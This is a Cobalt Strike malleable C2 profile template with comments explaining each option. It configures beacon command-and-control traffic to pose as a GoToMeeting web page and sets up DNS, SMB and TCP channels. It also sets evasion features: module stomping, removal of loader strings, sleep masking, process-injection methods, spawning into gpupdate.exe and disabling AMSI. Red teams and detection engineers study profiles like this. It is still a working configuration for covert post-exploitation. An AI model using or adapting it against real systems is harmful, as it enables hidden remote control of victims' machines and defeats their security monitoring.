#template profile - updated with 3.14 options
#options from https://www.cobaltstrike.com/help-malleable-c2 and https://www.cobaltstrike.com/help-malleable-postex
#attempt to get everything in one place with examples.
#xx0hcd

###global options###

#shows profile name in reports.
set sample_name "whatever.profile";

set sleeptime "37500";
set jitter    "33";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";

#set true to use staged payloads, false to disable staged payloads.
#set host_stage "false";

###DNS options###
set dns_idle "8.8.8.8";
set maxdns    "245";
set dns_sleep "0";
set dns_stager_prepend "";
set dns_stager_subhost "";
set dns_max_txt "252";
set dns_ttl "1";

###SMB options###
#use different strings for pipename and pipename_stager.
set pipename "ntsvcs";
set pipename_stager "scerpc";

###TCP options###
set tcp_port "8000";

###SSL Options###
#custom cert
#https-certificate {
    #set keystore "your_store_file.store";
    #set password "your_store_pass";
#}

#self sign cert
https-certificate {
    set C "US";
    set CN "whatever.com";
    set L "California";
    set O "whatever LLC.";
    set OU "local.org";
    set ST "CA";
    set validity "365";
}

#code sign cert.
#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
#Order of server response headers. Or you can just fill them in manually under the server blocks.
http-config {
    set headers "Server, Content-Type, Cache-Control, Connection";
    header "Content-Type" "text/html;charset=UTF-8";
    header "Connection" "close";
    header "Cache-Control" "max-age=2";
    header "Server" "nginx";
    #set "true" if teamserver is behind redirector
    set trust_x_forwarded_for "false";
}

###HTTP-GET Block###
#the http-get block checks if there are tasks queued.
http-get {

#You can specifiy multiple URI's with space between them.
    set uri "/login /config /admin";

#default method is GET.
    set verb "GET";
    #set verb "POST";
    
    client {

#Set headers based on traffic capture/Burp/etc.
        header "Host" "whatever.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";

	   
    metadata {
#Encoding options = append "string", base64, base64url, mask, netbios, netbiosu, prepend "string".
        #base64
        base64url;
        #mask;
        #netbios;
        #netbiosu;
        #prepend "TEST123";
        append ".php";

#Termination statements = header "header", parameter "key", print, uri-append. 
        parameter "file";
        #header "Cookie";
        #uri-append;
#Have to set verb to POST if you want to use print in the client GET block.
        #print;


    }

#You can also add parameter values just to help mimic your site traffic.
    parameter "test1" "test2";

    }

    server {
#headers are defined in the http-config block above, or you can set them manually here.
        #header "Server" "nginx";
 
#the output keyword allows you to prepend/append data, to add site traffic, etc.       
        output {

            netbios;
            #netbiosu;
            #base64;
            #base64url;
            #mask;
            	    

#Use prepend and append to mix your data in with normal looking site traffic. Escape double quotes and you can also use '\n'. c2lint shows '\n' as a period, but you can run it through Burp or pcap a HTTP payload to make sure everything is lining up correctly. Prepend strings need to be entered in reverse order, so the first string here is '"<!DOCTYPE html>\n";'.   
	    prepend "content=";
	    prepend "<meta name=\"google-site-verification\"\n";
	    prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
	    prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
	    prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
	    prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
	    prepend "        <meta charset=\"UTF-8\">\n";
	    prepend "    <head>\n";
	    prepend "<html lang=\"en\">\n";
	    prepend "<!DOCTYPE html>\n";

	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
	    append "<script type=\"text/javascript\">\n";
	    append "  var _kiq = _kiq || [];\n";
	    append "  (function(){\n";
	    append "    setTimeout(function(){\n";
	    append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
	    append "d.createElement('script'); s.type = 'text/javascript';\n";
	    append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
	    append "f.parentNode.insertBefore(s, f);\n";
	    append "    }, 1);\n";
	    append "})();\n";
	    append "</script>\n";
	    append "</body>\n";
	    append "</html>\n";

#All server blocks use 'print' to termintate.
            print;
        }
    }
}

###HTTP-Post Block###
#The same transform and termination rules apply as the client GET section above.
#if tasks are queued then http-post block processes them.
http-post {
    
#URI's cannot be the same as the http-get block URI's, even changing one case is fine.
    set uri "/Login /Config /Admin";
    set verb "GET";
    #set verb "POST";

    client {


	header "Host" "whatever.com";
        header "Accept" "*/*";
        header "Accept-Language" "en";
	header "Connection" "close";     
        
        output {
            base64url; 
	    parameter "testParam";
        }

#You can put the beacon id in - parameter "key", header "header", 
#cannot add transform statements to beacon id.
        id {
	    base64url;
	    parameter "id";
            #header "ID-Header":

        }
    }

    server {
#headers are defined in the http-config block above, or you can set them manually here.
        #header "Server" "nginx";

        output {
            netbios;	    
	   
	    prepend "content=";
	    prepend "<meta name=\"google-site-verification\"\n";
	    prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
	    prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
	    prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
	    prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
	    prepend "        <meta charset=\"UTF-8\">\n";
	    prepend "    <head>\n";
	    prepend "<html lang=\"en\">\n";
	    prepend "<!DOCTYPE html>\n";

	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
	    append "<script type=\"text/javascript\">\n";
	    append "  var _kiq = _kiq || [];\n";
	    append "  (function(){\n";
	    append "    setTimeout(function(){\n";
	    append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
	    append "d.createElement('script'); s.type = 'text/javascript';\n";
	    append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
	    append "f.parentNode.insertBefore(s, f);\n";
	    append "    }, 1);\n";
	    append "})();\n";
	    append "</script>\n";
	    append "</body>\n";
	    append "</html>\n";
            print;
        }
    }
}

###HTTP-Stager Block###
#Options to set if you are using a staged payload.
http-stager {

#Same URI rules apply as above, can't have URI's that match in any other client block.
    set uri_x86 "/Console";
    set uri_x64 "/console";

    client {
        header "Host" "whatever.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";
	
	#can use a parameter as well
	parameter "test1" "test2";
    }

    server {
#headers are defined in the http-config block above, or you can set them manually here.
        #header "Server" "nginx";
	
	output {
	
	    prepend "content=";
	    
	    append "</script>\n";
	    print;
	}

    }


}





###Malleable PE/Stage Block###
#use peclone on the dll you want to use, this example uses wwanmm.dll. You can also set the values manually.
#don't use 'set image_size_xx' if using 'set module_xx'. During testing it seemed to double the size of my payload causing module stomp to fail, need to test it out more though.
stage {
    set checksum       "0";
    set compile_time   "25 Oct 2016 01:57:23";
    set entry_point    "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	   "WWanMM.dll";
    set userwx 	   "false";
    set cleanup	   "true";
    set sleep_mask	   "true";
    set stomppe	   "true";
    set obfuscate	   "true";
    set rich_header    "\xee\x50\x19\xcf\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xa3\x49\xe4\x9c\x84\x31\x77\x9c\x1e\xad\x86\x9c\xae\x31\x77\x9c\x1e\xad\x85\x9c\xa7\x31\x77\x9c\xaa\x31\x76\x9c\x08\x31\x77\x9c\x1e\xad\x98\x9c\xa3\x31\x77\x9c\x1e\xad\x84\x9c\x98\x31\x77\x9c\x1e\xad\x99\x9c\xab\x31\x77\x9c\x1e\xad\x80\x9c\x6d\x31\x77\x9c\x1e\xad\x9a\x9c\xab\x31\x77\x9c\x1e\xad\x87\x9c\xab\x31\x77\x9c\x52\x69\x63\x68\xaa\x31\x77\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    
    #obfuscate beacon before sleep.
    set sleep_mask "true";

#module stomp. Make sure the dll you use is bigger than your payload and test it with post exploit options to make sure everything is working.

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

#transform allows you to remove, replace, and add strings to beacon's reflective dll stage.
    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

#can set a string in the .rdata section of the beacon dll.
    #adds a zero-terminated string
    #string "something";

    #adds a string 'as-is'
    #data "something";

    #adds a wide (UTF-16LE encoded) string
    stringw "something"; 
}

###Process Inject Block###
#controls process injection behavior
process-inject {

    #Can use NtMapViewOfSection or VirtualAllocEx
    #NtMapViewOfSection only allows same arch to same arch process injection.
    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
 
    #prepend has to be valid code for current arch       
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        CreateThread;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";

}
